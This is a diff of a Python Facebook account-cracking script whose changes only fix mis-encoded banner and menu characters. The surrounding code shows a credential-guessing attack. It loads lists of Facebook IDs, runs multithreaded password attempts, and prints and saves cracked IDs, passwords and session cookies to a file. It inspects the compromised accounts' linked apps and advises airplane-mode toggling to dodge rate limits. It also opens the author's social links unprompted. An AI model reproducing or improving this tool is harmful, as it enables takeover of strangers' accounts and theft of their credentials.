@@ -144,12 +144,12 @@ def back():
 	login()
 	
 os.system("clear")
-_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195mâ€¢\033[38;5;196m]\033[1;32mcreate by Sajjad Sordar...............')
-_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195mâ€¢\033[38;5;196m]\033[1;32mupdate done.............')
-_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195mâ€¢\033[38;5;196m]\033[1;32monly file clone bro.............')
-_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195mâ€¢\033[38;5;196m]\033[1;32madd my messenger group ')
-_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195mâ€¢\033[38;5;196m]\033[1;32m70% free fireðŸŒ¹')
-_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195mâ€¢\033[38;5;196m]\033[38;5;195m FOLLOW MY FB ACCOUNT............')                                        
+_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mcreate by Sajjad Sordar...............')
+_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32mupdate done.............')
+_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32monly file clone bro.............')
+_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32madd my messenger group ')
+_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32m70% free fire🌹')
+_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;195m FOLLOW MY FB ACCOUNT............')                                        
 os.system('xdg-open https://www.facebook.com/profile.php?id=100088316394289&mibextid=ZbWKwL')
 os.system('clear')
 
@@ -196,15 +196,15 @@ ____________________SAJJAD-SORDAR___________________
 \033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mSajjad Sordar
 \033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35m Sajjadsordar
 \033[1;32m[+] \033[1;36mWHATSAPP     :  \033[1;36mOff
-\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m 3.0.1 ã€ŠG.S.Tã€‹ free tools ðŸ˜
+\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m 3.0.1 《G.S.T》 free tools 😍
 \033[1;32m[+] \033[1;32m[+]==========================================""")
 
-_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195mâ€¢\033[38;5;196m]\033[1;32madd my messenger group ')
+_Sajjadsordar_(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[1;32madd my messenger group ')
 os.system('xdg-open https://m.me/j/AbbmEQT-EbT2RYf3/')
 os.system('clear')
 
-_Sajjadsordar_(f' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \033[47m\033[1;31mWhat Is Your Name\033[40m\033[00m')
-Sajjadsordar_VAI=input(f' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ Your Name âž¤\x1b[1;96m ')
+_Sajjadsordar_(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[47m\033[1;31mWhat Is Your Name\033[40m\033[00m')
+Sajjadsordar_VAI=input(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Your Name ➤\x1b[1;96m ')
 os.system("xdg-open https://www.facebook.com/gangstter.ceo?mibextid=ZbWKwL")
 
 #------------------[ BAGIAN-MENU ]----------------#
@@ -213,17 +213,17 @@ def menu():
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
-	_Sajjadsordar_(f'\033[93;1mâ”â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”“')
-	_Sajjadsordar_(f'\033[93;1mâ”‚\033[47m\033[1;30mðð‘ð„ðŒðˆð”ðŒ ð”ð’ð„ð‘ ðˆðð…ðŽð‘ðŒð€ð“ðˆðŽð\033[40m\033[00m\033[93;1mâ”‚')
-	_Sajjadsordar_(f'\033[93;1mâ” â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¯â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”›')
-	_Sajjadsordar_(f'\033[93;1mâ”‚\x1b[1;92mð˜ð¨ð®ð« ððšð¦ðž\033[93;1mâ”€â”€â”€â”€â•‚âž¤\x1b[1;92m '+str(Sajjadsordar_VAI))
-	_Sajjadsordar_(f'\033[93;1mâ”‚\x1b[1;92mð˜ð¨ð®ð« ðˆð\033[93;1mâ”€â”€â”€â”€â”€â”€â•‚âž¤ \x1b[1;92m{ip}')
-	_Sajjadsordar_(f'\033[93;1mâ”—â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”›')
-	_Sajjadsordar_(f'\033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \033[47m\033[1;34m  ð‚ð‘ð€ð‚ðŠ ðŒð„ð“ð‡ðŽðƒ  \033[40m\033[00m')
-	_Sajjadsordar_(f'\033[93;1m[\x1b[1;92m1\033[93;1m]\x1b[1;92m ð…ðˆð‹ð„ ð‚ð‘ð€ð‚ðŠ')
-	#_Sajjadsordar_(f'\033[93;1m[\x1b[1;92m2\033[93;1m]\x1b[1;92m ð‘ð€ððƒðŽðŒ ð‚ð‘ð€ð‚ðŠ')
-	_Sajjadsordar_(f'\033[93;1m[\x1b[1;92m3\033[93;1m]\x1b[1;92m ð‚ðŽðð“ð€ð‚ð“ ðŒð„')
-	_____Sajjadsordar_____ = input('\033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \x1b[1;94mð‚ð¡ð¨ð¢ðœðž âž¤\x1b[1;92m ')
+	_Sajjadsordar_(f'\033[93;1m┏────────────────────────┓')
+	_Sajjadsordar_(f'\033[93;1m│\033[47m\033[1;30m𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍\033[40m\033[00m\033[93;1m│')
+	_Sajjadsordar_(f'\033[93;1m┠─────────────┯──────────┛')
+	_Sajjadsordar_(f'\033[93;1m│\x1b[1;92m𝐘𝐨𝐮𝐫 𝐍𝐚𝐦𝐞\033[93;1m────╂➤\x1b[1;92m '+str(Sajjadsordar_VAI))
+	_Sajjadsordar_(f'\033[93;1m│\x1b[1;92m𝐘𝐨𝐮𝐫 𝐈𝐏\033[93;1m──────╂➤ \x1b[1;92m{ip}')
+	_Sajjadsordar_(f'\033[93;1m┗─────────────┛')
+	_Sajjadsordar_(f'\033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[47m\033[1;34m  𝐂𝐑𝐀𝐂𝐊 𝐌𝐄𝐓𝐇𝐎𝐃  \033[40m\033[00m')
+	_Sajjadsordar_(f'\033[93;1m[\x1b[1;92m1\033[93;1m]\x1b[1;92m 𝐅𝐈𝐋𝐄 𝐂𝐑𝐀𝐂𝐊')
+	#_Sajjadsordar_(f'\033[93;1m[\x1b[1;92m2\033[93;1m]\x1b[1;92m 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊')
+	_Sajjadsordar_(f'\033[93;1m[\x1b[1;92m3\033[93;1m]\x1b[1;92m 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐌𝐄')
+	_____Sajjadsordar_____ = input('\033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \x1b[1;94m𝐂𝐡𝐨𝐢𝐜𝐞 ➤\x1b[1;92m ')
 	if _____Sajjadsordar_____ in ['1']:
 		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
 		F()
@@ -236,10 +236,10 @@ def menu():
 		os.system("xdg-open https://www.facebook.com/gangstter.ceo?mibextid=ZbWKwL")
 		os.system('rm -rf .cookie.txt')
 	else:
-		print(' \033[93;1mâž¤\x1b[1;96mâž¤\033[93;1mâž¤ ð–ð«ð¨ð§ð  ð‚ð¡ð¨ð¢ðœðž ððšð«ðš ðŸ˜© ')
+		print(' \033[93;1m➤\x1b[1;96m➤\033[93;1m➤ 𝐖𝐫𝐨𝐧𝐠 𝐂𝐡𝐨𝐢𝐜𝐞 𝐁𝐚𝐫𝐚 😩 ')
 		exit()
 def error():
-	print(f' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \033[93;1mð’ð¨ð«ð«ð², ðð¥ð³ ð‚ð¡ð¨ð¨ð¬ðž ð­ð¡ðž ð‘ð¢ð ð¡ð­ ðŒðžð§ð®')
+	print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1m𝐒𝐨𝐫𝐫𝐲, 𝐏𝐥𝐳 𝐂𝐡𝐨𝐨𝐬𝐞 𝐭𝐡𝐞 𝐑𝐢𝐠𝐡𝐭 𝐌𝐞𝐧𝐮')
 	time.sleep(2)
 	back()
 	
@@ -252,7 +252,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
     else:
-        print(f'\r[ðŸŽ®] %s â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
+        print(f'\r[🎮] %s ☆ Your Active Apps ☆     :{WHITE}'%(GREEN))
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         else:
@@ -264,7 +264,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
     else:
-        print(f'\r[ðŸŽ®] %s â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
+        print(f'\r[🎮] %s ◇ Your Expired Apps ◇    :{WHITE}'%(M))
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
@@ -283,19 +283,19 @@ class D:
 		os.system("clear")
 		banner()
 		try:
-			_Sajjadsordar_(f' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \033[47m\033[1;35m     Example: /sdcard/folder name.txt     \033[40m\033[00m')
-			fileX = input (' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ Enter Your File âž¤\x1b[1;93m ') 
+			_Sajjadsordar_(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[47m\033[1;35m     Example: /sdcard/folder name.txt     \033[40m\033[00m')
+			fileX = input (' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Enter Your File ➤\x1b[1;93m ') 
 			for line in open(fileX, 'r').readlines():
 				id.append(line.strip())
-			print(f' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \x1b[1;96TOTAL ID âž¤ \x1b[1;92m'+str(len(id)))
+			print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \x1b[1;96TOTAL ID ➤ \x1b[1;92m'+str(len(id)))
 			Settings()
 		except IOError:
-			print(" \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \033[93;1m file %s not found\x1b[0m"%(fileX));time.sleep(2)
+			print(" \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1m file %s not found\x1b[0m"%(fileX));time.sleep(2)
 			F()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def Settings():
-	_Sajjadsordar_(f' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \033[93;1m[\x1b[1;92m1\033[93;1m]\x1b[1;92m Only New Id \x1b[1;92m[BEST]\n \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \033[93;1m[\x1b[1;92m2\033[93;1m]\x1b[1;92m New Old Mix')
-	hu = input(' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \x1b[1;94mChoose âž¤\x1b[1;92m ')
+	_Sajjadsordar_(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1m[\x1b[1;92m1\033[93;1m]\x1b[1;92m Only New Id \x1b[1;92m[BEST]\n \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1m[\x1b[1;92m2\033[93;1m]\x1b[1;92m New Old Mix')
+	hu = input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \x1b[1;94mChoose ➤\x1b[1;92m ')
 	if hu in ['1','01']:
 		muda=[]
 		for bacot in sorted(id):
@@ -310,20 +310,20 @@ def Settings():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print(' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \033[93;1mWrong Option Bara')
+		print(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1mWrong Option Bara')
 		exit()
 	
-	print(f' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \033[93;1m[\x1b[1;92m1\033[93;1m]\x1b[1;92m Mobile [BEST]')
-	hc = input(' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \x1b[1;94mChoose âž¤\x1b[1;92m ')
+	print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1m[\x1b[1;92m1\033[93;1m]\x1b[1;92m Mobile [BEST]')
+	hc = input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \x1b[1;94mChoose ➤\x1b[1;92m ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	else:
 		method.append('mobile')
-	pwplus=input(' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \033[47m\033[1;35m     PASSWORD MENU     \033[40m\033[00m\n \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ Manual Password \033[93;1m[m]\n \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ Auto Password \x1b[1;96m[d] \x1b[1;92m[BEST]\n \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \x1b[1;94mChoice âž¤ \x1b[1;92m')
+	pwplus=input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[47m\033[1;35m     PASSWORD MENU     \033[40m\033[00m\n \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Manual Password \033[93;1m[m]\n \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Auto Password \x1b[1;96m[d] \x1b[1;92m[BEST]\n \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \x1b[1;94mChoice ➤ \x1b[1;92m')
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		print(f'Add Password Manual Minimam 6 Character')
-		pwku=input(' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ Add Password Manual : ')
+		pwku=input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Add Password Manual : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
@@ -334,13 +334,13 @@ def Settings():
 os.system("clear")
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	print(f'\033[93;1mâ—\x1b[1;92mâ•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•\033[93;1mâ´\033[47m\033[1;30mSajjadsordar M\033[40m\033[00m\033[93;1mâµ\x1b[1;92mâ•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•\033[93;1mâ—')
-	_Sajjadsordar_(f"\033[93;1m [â¤ï¸] \x1b[1;92mð˜ð¨ð®ð« ððšð¦ðž         \033[93;1mâž¤ \x1b[1;92m"+str(Sajjadsordar_VAI))
-	print(f"\033[93;1m [â¤ï¸] \x1b[1;92mð“ðŽð“ð€ð‹ ðˆðƒ          \033[93;1mâž¤ \x1b[1;92m"+str(len(id)))
-	print(f"\033[93;1m [â¤ï¸] \x1b[1;92mð“ðŽðƒð€ð˜ ð“ðˆðŒð„        \033[93;1mâž¤ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
-	print(f"\033[93;1m [â¤ï¸] \x1b[1;92mð“ðŽðƒð€ð˜ ðƒð€ð“ð„        \033[93;1mâž¤ \x1b[1;92m{ha}\033[93;1m/\x1b[1;92m{bu}\033[93;1m/\x1b[1;92m{ta} ")
-	print(f"\033[93;1m [â¤ï¸] \033[93;1mððŽð“ð„ âž¤ \33[1;92m[ ð”ð’ð„ ð€ðˆð‘ðð‹ð€ðð„ ðŒðŽðƒð„ ðð„ð…ðŽð‘ð„ ð”ð’ð„ ] ")
-	print(f'\033[93;1mâ—\x1b[1;92mâ•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•\033[93;1mâ´\033[47m\033[1;30mSajjadsordar M\033[40m\033[00m\033[93;1mâµ\x1b[1;92mâ•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•â”â•\033[93;1mâ—\n')
+	print(f'\033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30mSajjadsordar M\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m●')
+	_Sajjadsordar_(f"\033[93;1m [❤️] \x1b[1;92m𝐘𝐨𝐮𝐫 𝐍𝐚𝐦𝐞         \033[93;1m➤ \x1b[1;92m"+str(Sajjadsordar_VAI))
+	print(f"\033[93;1m [❤️] \x1b[1;92m𝐓𝐎𝐓𝐀𝐋 𝐈𝐃          \033[93;1m➤ \x1b[1;92m"+str(len(id)))
+	print(f"\033[93;1m [❤️] \x1b[1;92m𝐓𝐎𝐃𝐀𝐘 𝐓𝐈𝐌𝐄        \033[93;1m➤ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+	print(f"\033[93;1m [❤️] \x1b[1;92m𝐓𝐎𝐃𝐀𝐘 𝐃𝐀𝐓𝐄        \033[93;1m➤ \x1b[1;92m{ha}\033[93;1m/\x1b[1;92m{bu}\033[93;1m/\x1b[1;92m{ta} ")
+	print(f"\033[93;1m [❤️] \033[93;1m𝐍𝐎𝐓𝐄 ➤ \33[1;92m[ 𝐔𝐒𝐄 𝐀𝐈𝐑𝐏𝐋𝐀𝐍𝐄 𝐌𝐎𝐃𝐄 𝐁𝐄𝐅𝐎𝐑𝐄 𝐔𝐒𝐄 ] ")
+	print(f'\033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30mSajjadsordar M\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m●\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -378,14 +378,14 @@ def passwrd():
 				pool.submit(crackfree,idf,pwv)
 			elif 'touch' in method:
 				pool.submit(cracktouch,idf,pwv)
-	print(f' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ ð‚ð‘ð€ð‚ðŠ ð‚ðŽðŒðð‹ð„ð“ð„ ')
-	print(f' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ OK : {h}%s '%(ok))
-	print(' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤  Main Manu \x1b[1;92m[Y]\n \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ \033[93;1mExit [T]')
-	woi = input(' \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ ð‚ð¡ð¨ð¢ðœðž : ')
+	print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ 𝐂𝐑𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 ')
+	print(f' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ OK : {h}%s '%(ok))
+	print(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤  Main Manu \x1b[1;92m[Y]\n \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ \033[93;1mExit [T]')
+	woi = input(' \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ 𝐂𝐡𝐨𝐢𝐜𝐞 : ')
 	if woi in ['y','Y']:
 		back()
 	else:
-		print(f'\t \033[93;1mâž¤\x1b[1;96mâž¤\x1b[1;92mâž¤ Allah Hafiz Bro {u} ')
+		print(f'\t \033[93;1m➤\x1b[1;96m➤\x1b[1;92m➤ Allah Hafiz Bro {u} ')
 		time.sleep(2)
 		exit()
 #--------------------[ METODE-B-API ]-----------------#
@@ -443,9 +443,9 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{H}\n Sajjadsordar-OK [ðŸ’š] {idf} | {pw}\n [ðŸ’‰]COOKIES âž¤ {kuki}\n ')
-				#print(f'\r{H}\n Sajjadsordar-OK    [ðŸ’š] {idf} \033[97;1m pass â¥\033[1;92m  {pw}')
-				#print(f'\r \033[93;1m Sajjadsordar-OK [ðŸ’š]  \033[1;92m{idf} \033[97;1m pass â¥\033[1;92m {pw}{N}')     
+				print(f'\r{H}\n Sajjadsordar-OK [💚] {idf} | {pw}\n [💉]COOKIES ➤ {kuki}\n ')
+				#print(f'\r{H}\n Sajjadsordar-OK    [💚] {idf} \033[97;1m pass ❥\033[1;92m  {pw}')
+				#print(f'\r \033[93;1m Sajjadsordar-OK [💚]  \033[1;92m{idf} \033[97;1m pass ❥\033[1;92m {pw}{N}')     
 				cek_apk(session,coki)
 				open('/sdcard/Sajjadsordar-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				#open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -461,7 +461,7 @@ def cek_opsi():
 	c = len(akun)
 	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
 	cetak(nel(hu, title='CEK OPSI'))
-	input(u+'['+h+'â€¢'+u+'] Mulai')
+	input(u+'['+h+'•'+u+'] Mulai')
 	cek = '# PROSES CEK OPSI DIMULAI'
 	sol().print(mark(cek, style='green'))
 	love = 0
